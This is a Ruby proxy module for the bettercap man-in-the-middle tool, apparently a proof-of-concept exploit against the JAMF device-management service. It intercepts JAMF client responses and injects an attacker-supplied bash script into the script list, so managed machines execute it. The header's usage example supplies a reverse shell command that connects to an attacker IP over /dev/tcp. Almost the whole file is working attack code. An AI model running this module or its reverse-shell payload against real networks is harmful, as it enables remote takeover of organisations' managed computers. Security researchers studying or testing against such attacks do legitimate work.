=begin
BETTERCAP
Author : Matias P. Brutti | Josh Pitts
Email  : matiasbrutti@gmail.com
This module is released under the MIT license.
Example: sudo bettercap -T 192.168.1.18 --proxy-module jamf_poc.rb --jamf-server jamfcloud.com --command " bash -i >& /dev/tcp/192.168.1.4/9090 0>&1 &" --proxy-https
=end

class JamfRce < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'JamfRce',
    'Description' => 'MITM JAMS and inject script',
    'Version'     => '1.0.0',
    'Author'      => "Matias P. Brutti, Josh Pitts",
    'License'     => 'MIT'
  )
  @@domain    = nil
  @@payload   = nil

  def self.on_options(opts)
    opts.on( '--jamf-server SERVER', 'JAMF Server to intercept traffic.' ) do |v|
      @@domain = v
    end

   opts.on( '--command COMMAND', 'Extension of the files to replace.' ) do |v|
      @@payload = "#!/bin/bash\n" + v + "\n"
   end

	 opts.on( '--script-file FILENAME', 'File to use in order to replace the ones matching the extension.' ) do |v|
      filename = File.expand_path v
      unless File.exists?(filename)
        raise BetterCap::Error, "#{filename} file does not exist."
      end
      @@payload = File.read(filename)
    end
  end

  def initialize
    raise BetterCap::Error, "No --jamf-server  option specified for the proxy module." if @@domain.nil?
		raise BetterCap::Error, "No --command or --script-file option specified for the proxy module." if @@payload.nil?
  end

  def on_request( request, response )
    if is_exploitable?(request,response)
			BetterCap::Logger.info "Injecting Malicious payload into https://#{request.host}#{request.path}."

      script = "<ns2:script><ns2:filename>payload</ns2:filename><ns2:osRequirement></ns2:osRequirement>" +
               "<ns2:priority>After</ns2:priority><ns2:parameters></ns2:parameters><ns2:contents>"+
               "<![CDATA[#{@@payload}]]></ns2:contents></ns2:script>"

      if response.body.include?("<ns2:scripts>")
        response.body.gsub!("<ns2:scripts>", "<ns2:scripts>" + script)
      elsif !response.body.include?("<ns2:scripts>") && response.body.include?("<ns2:scripts />")
        response.body.gsub!("<ns2:scripts />", "<ns2:scripts><ns2:scripts>" + script + "</ns2:scripts>")
      end
    end
  end

  private
  def is_exploitable?(request,response)
		request.host.include?(@@domain) && request.post? && request.path.include?("/client") && response.body.include?("<ns2:scripts")
	end
end
